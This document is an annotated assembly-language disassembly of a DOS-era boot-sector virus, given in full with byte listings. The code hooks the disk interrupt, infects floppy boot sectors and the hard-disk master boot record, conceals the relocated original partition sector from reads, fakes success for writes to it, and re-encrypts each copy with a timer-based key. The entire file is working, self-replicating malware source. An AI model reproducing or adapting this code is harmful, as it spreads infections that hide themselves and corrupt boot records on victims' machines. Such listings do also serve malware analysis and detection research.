S0000   SEGMENT
    ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
    ORG $+7C00H

    JMP FAR PTR L07C0:L019F ;=7D9F      ;7C00 EA 9F 01 C0 07

;================================================
;   Coded part of virus
;------------------------------------------------
L7C05   db  0       ;0 = FDD, 2 = HDD   ;7C05 00

L7C06   dw  0A189h      ;oryginal int 13h - off ;7C06 89 A1
L7C08   dw          ;         - seg ;7C08 00 F0

                ;<- entry point into copied virus code
L7C0A   dw  00FAh       ;= offset L7CFA     ;7C0A FA 00
L7C0C   dw  9FC0h       ;virus segment in memory;7C0C C0 9F

L7C0E   dw  7C00h,0000h ;boot sector entry point;7C0E 00 7C 00 00

;================================================
;   Virus int 13h service
;------------------------------------------------
L7C12:  pushf                       ;7C12 9C
    push    ds                  ;7C13 1E
    push    dx                  ;7C14 52
    PUSH    SI                  ;7C15 56
    PUSH    DI                  ;7C16 57
    PUSH    AX                  ;7C17 50
    PUSH    BX                  ;7C18 53
    PUSH    CX                  ;7C19 51
    PUSH    ES                  ;7C1A 06
    CMP DL,80H      ;HDD ?          ;7C1B 80 FA 80
    JNB L7C5F       ;-> yes         ;7C1E 73 3F
    CMP AH,2        ;read ?         ;7C20 80 FC 02
    JNZ L7C5F       ;-> no          ;7C23 75 3A
    XOR AX,AX                   ;7C25 31 C0
    MOV DS,AX                   ;7C27 8E D8
    CMP BYTE PTR DS:[46Ch],16h  ;timer counter  ;7C29 80 3E 6C 04 16
    JNB L7C5F                   ;7C2E 73 2F
    PUSH    CS                  ;7C30 0E
    POP ES                  ;7C31 07
    MOV AX,201H     ;read 1 sector      ;7C32 B8 01 02
    MOV BX,200H     ;buffer         ;7C35 BB 00 02
    MOV CX,1        ;track=0, sector=1  ;7C38 B9 01 00
    XOR DH,DH       ;head=0         ;7C3B 30 F6
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7C3D E8 64 00
    JB  L7C5F       ;-> error       ;7C40 72 1D
    CALL    L7CAB       ;sector infected ?  ;7C42 E8 66 00
    JZ  L7C5F       ;-> yes         ;7C45 74 18
    MOV AX,301H     ;write 1 sector     ;7C47 B8 01 03
    MOV CL,2        ;track=0, sector=2  ;7C4A B1 02
    MOV DH,1        ;head=1         ;7C4C B6 01
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7C4E E8 53 00
    JB  L7C5F       ;-> error       ;7C51 72 0C
    CALL    L7D70       ;Make coded virus copy  ;7C53 E8 1A 01
    MOV AX,301H     ;write 1 sector     ;7C56 B8 01 03
    DEC CX      ;track=0, sector=1  ;7C59 49
    XOR DH,DH       ;head=0         ;7C5A 30 F6
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7C5C E8 45 00

            ;<- EXIT
L7C5F:  POP ES                  ;7C5F 07
    POP CX                  ;7C60 59
    POP BX                  ;7C61 5B
    POP AX                  ;7C62 58
    POP DI                  ;7C63 5F
    POP SI                  ;7C64 5E
    POP DX                  ;7C65 5A
    POP DS                  ;7C66 1F
    POPF                        ;7C67 9D
    PUSH    CX                  ;7C68 51
    PUSH    DX                  ;7C69 52
    PUSHF                       ;7C6A 9C
    CMP CX,1        ;track=0, sector=1 ?    ;7C6B 83 F9 01
    JNZ L7C9C       ;-> no, exit        ;7C6E 75 2C
    CMP DX,80H      ;HDD ?          ;7C70 81 FA 80 00
    JNZ L7C9C       ;-> no, exit        ;7C74 75 26
    CMP AH,2        ;read ?         ;7C76 80 FC 02
    JZ  L7C86       ;-> yes         ;7C79 74 0B
    CMP AH,3        ;write ?        ;7C7B 80 FC 03
    JNZ L7C9C       ;-> no, exit        ;7C7E 75 1C

    ;<----- write partition table
    XOR AH,AH       ;error code = 0     ;7C80 30 E4
    POPF                        ;7C82 9D
    CLC         ;no error ptr       ;7C83 F8
    JMP SHORT   L7C8D   ;-> exit, no action ;7C84 EB 07

    ;<----- read partition table
L7C86:  MOV CX,7        ;track=0, sector=7  ;7C86 B9 07 00
    POPF                        ;7C89 9D
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7C8A E8 17 00
L7C8D:  POP DX                  ;7C8D 5A
    POP CX                  ;7C8E 59
    RETF    2                   ;7C8F CA 02 00

    db  039h,05Ch,07Ah,087h,07Ah    ;7C92 39 5C 7A 87 7A
    db  07Dh,082h,07Ah,087h,039h    ;7C97 7D 82 7A 87 39
    ;db ' Canadian ' incremented by 19h

                ;<- EXIT
L7C9C:  POPF                        ;7C9C 9D
    POP DX                  ;7C9D 5A
    POP CX                  ;7C9E 59
    JMP DWORD PTR CS:[6]  ;oryginal int 13h ;7C9F 2E FF 2E 06 00

;================================================
;   Execute oryginal int 13h
;------------------------------------------------
L7CA4:  PUSHF                       ;7CA4 9C
    CALL    DWORD PTR   CS:6            ;7CA5 2E FF 1E 06 00
    RETN                        ;7CAA C3

;================================================
;   Check if sector allready infected
;------------------------------------------------
L7CAB:  PUSH    CS                  ;7CAB 0E
    POP DS                  ;7CAC 1F
    XOR SI,SI                   ;7CAD 31 F6
    MOV DI,200H                 ;7CAF BF 00 02
    MOV CX,2                    ;7CB2 B9 02 00
    CLD                     ;7CB5 FC
    REPZ    CMPSW                   ;7CB6 F3 A7
    RETN                        ;7CB8 C3

;================================================
;   Coded part Entry point
;------------------------------------------------
L7CB9:  XOR AX,AX                   ;7CB9 33 C0
    MOV DS,AX                   ;7CBB 8E D8

    CLI         ;Establish stack    ;7CBD FA
    MOV SS,AX                   ;7CBE 8E D0
    MOV SP,7C00h                ;7CC0 BC 00 7C
    STI                     ;7CC3 FB
                ;<- get int 13h vector
    MOV AX,DS:[4Ch] ;int 13h offset     ;7CC4 A1 4C 00
    MOV [L7C06],AX              ;7CC7 A3 06 7C
    MOV AX,DS:[4Eh] ;int 13h segment    ;7CCA A1 4E 00
    MOV [L7C08],AX              ;7CCD A3 08 7C

    MOV AX,DS:[413h]    ;BIOS memory size   ;7CD0 A1 13 04
    DEC AX      ; - 1 KB        ;7CD3 48
    MOV DS:[413h],AX                ;7CD4 A3 13 04
    MOV CL,6                    ;7CD7 B1 06
    SHL AX,CL       ;KB -> paragraph    ;7CD9 D3 E0
    MOV ES,AX                   ;7CDB 8E C0
    MOV [L7C0C],AX              ;7CDD A3 0C 7C
    MOV DS:[4Eh],AX ;int 13h segment    ;7CE0 A3 4E 00
    MOV AX,12H      ;= L7C12        ;7CE3 B8 12 00
    MOV DS:[4Ch],AX ;int 13h offset     ;7CE6 A3 4C 00
    MOV CX,100h     ;virus length (words)   ;7CE9 B9 00 01
    PUSH    CS                  ;7CEC 0E
    POP DS                  ;7CED 1F
    XOR SI,SI                   ;7CEE 33 F6
    XOR DI,DI                   ;7CF0 31 FF
    CLD                     ;7CF2 FC
    REPZ    MOVSW       ;virus code copy    ;7CF3 F3 A5
    JMP DWORD PTR CS:[0Ah]  ;=L7C0A     ;7CF5 2E FF 2E 0A 00

L7CFA:  XOR AX,AX       ;reset disk system  ;7CFA 31 C0
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7CFC E8 A5 FF
    XOR AX,AX                   ;7CFF 33 C0
    MOV ES,AX                   ;7D01 8E C0
    MOV AX,201h     ;read 1 sector      ;7D03 B8 01 02
    MOV BX,7C00h    ;boot sector buffer ;7D06 BB 00 7C
    CMP BYTE PTR CS:[5],0           ;7D09 2E 80 3E 05 00 00
    JZ  L7D1C                   ;7D0F 74 0B

                ;<- HDD
    MOV CX,7        ;track=0, sector=7  ;7D11 B9 07 00
    MOV DX,80H      ;head=0, drive=C:   ;7D14 BA 80 00
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7D17 E8 8A FF
    JMP SHORT   L7D65               ;7D1A EB 49

                ;<- FDD
L7D1C:  MOV CX,2        ;track=0, sector=2  ;7D1C B9 02 00
    MOV DX,100H     ;head=1, drive=A:   ;7D1F BA 00 01
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7D22 E8 7F FF
    JB  L7D65       ;-> error       ;7D25 72 3E
    PUSH    CS                  ;7D27 0E
    POP ES                  ;7D28 07
    MOV AX,201H     ;read 1 sector      ;7D29 B8 01 02
    MOV BX,200H     ;buffer         ;7D2C BB 00 02
    MOV CL,1        ;track=0, sector=1 (MBR);7D2F B1 01
    MOV DX,80H      ;head=0,drive=C:    ;7D31 BA 80 00
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7D34 E8 6D FF
    JB  L7D65       ;-> error       ;7D37 72 2C
    CALL    L7CAB       ;sector infected ?  ;7D39 E8 6F FF
    JZ  L7D65       ;-> yes         ;7D3C 74 27
    MOV BYTE PTR CS:[5],2   ;HDD ptr    ;7D3E 2E C6 06 05 00 02
    MOV AX,301H     ;write 1 sector     ;7D44 B8 01 03
    MOV CX,7        ;track=0, sector=7  ;7D47 B9 07 00
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7D4A E8 57 FF
    JB  L7D65       ;-> error       ;7D4D 72 16
    MOV SI,3BEH     ;partition table    ;7D4F BE BE 03
    MOV DI,1BEH                 ;7D52 BF BE 01
    MOV CX,20H      ;table length       ;7D55 B9 20 00
    CLD                     ;7D58 FC
    REPZ    MOVSW       ;move partition table   ;7D59 F3 A5
    CALL    L7D70       ;Make coded virus copy  ;7D5B E8 12 00
    MOV AX,301H     ;write 1 sector     ;7D5E B8 01 03
    INC CX      ;track=0, sector=1  ;7D61 41
    CALL    L7CA4       ;EXEC oryginal int 13h  ;7D62 E8 3F FF

L7D65:  MOV BYTE PTR CS:[5],0           ;7D65 2E C6 06 05 00 00
    JMP DWORD PTR CS:[0Eh]  ;=7C0E=run boot ;7D6B 2E FF 2E 0E 00

;================================================
;   Make coded copy of virus
;------------------------------------------------
L7D70:  PUSH    CX                  ;7D70 51
    PUSH    DX                  ;7D71 52
    MOV AH,0        ;read system-timer time ;7D72 B4 00
    INT 1AH                 ;7D74 CD 1A
    CMP DL,0        ;lowest order part  ;7D76 80 FA 00
    JNZ L7D7C                   ;7D79 75 01
    INC DX                  ;7D7B 42
L7D7C:  MOV DS:[1AFh],DL    ;encription key     ;7D7C 88 16 AF 01
    XOR SI,SI                   ;7D80 31 F6
    MOV DI,200H                 ;7D82 BF 00 02
    MOV CX,100H                 ;7D85 B9 00 01
    CLD                     ;7D88 FC
    REPZ    MOVSW       ;virus code copy    ;7D89 F3 A5
    MOV DI,205H     ;coded area begin   ;7D8B BF 05 02
    MOV CX,19AH     ;coded area length  ;7D8E B9 9A 01
    MOV AH,DS:[1AFh]    ;encryption key     ;7D91 8A 26 AF 01
L7D95:  MOV AL,[DI]                 ;7D95 8A 05
    SUB AL,AH                   ;7D97 28 E0
    STOSB                       ;7D99 AA
    LOOP    L7D95                   ;7D9A E2 F9
    POP DX                  ;7D9C 5A
    POP CX                  ;7D9D 59
    RETN                        ;7D9E C3
;------------------------------------------------
;   End of coded part of virus
;================================================



;================================================
;   Encoder routine
;------------------------------------------------
L7D9F:  mov ax,cs                   ;7D9F 8C C8
    MOV DS,AX                   ;7DA1 8E D8
    MOV ES,AX                   ;7DA3 8E C0
    MOV DI,5                    ;7DA5 BF 05 00
    MOV CX,19AH                 ;7DA8 B9 9A 01
    CLD                     ;7DAB FC
L7DAC:  MOV AL,[DI]                 ;7DAC 8A 05
    ADD AL,7                    ;7DAE 04 07
L7DAF   equ $-1     ;code value
    STOSB                       ;7DB0 AA
    LOOP    L7DAC                   ;7DB1 E2 F9
    JMP L7CB9                   ;7DB3 E9 03 FF

    db  'PCAT',0     ;7DB6 03 50 43 03 41 54 03 00

;===============================================
;   Partition table
;-----------------------------------------------
    db  080h,001h,001h,000h,004h,009h,051h,069h ;7DBE 80 01 01 00 04 09 51 69
    db  011h,000h,000h,000h,053h,0F0h,000h,000h ;7DC6 11 00 00 00 53 F0 00 00

    db  000h,000h,041h,06Ah,005h,009h,0D1h,0FBh ;7DCE 00 00 41 6A 05 09 D1 FB
    db  064h,0F0h,000h,000h,0F4h,0B4h,001h,000h ;7DD6 64 F0 00 00 F4 B4 01 00

    db  0,0,0,0,0,0,0,0             ;7DDE 00 00 00 00 00 00 00 00
    db  0,0,0,0,0,0,0,0             ;7DE6 00 00 00 00 00 00 00 00

    db  0,0,0,0,0,0,0,0             ;7DEE 00 00 00 00 00 00 00 00
    db  0,0,0,0,0,0,0,0             ;7DF6 00 00 00 00 00 00 00 00

    db  055h,0AAh   ;boot sector mark   ;7DFE 55 AA

S0000   ENDS

    END 
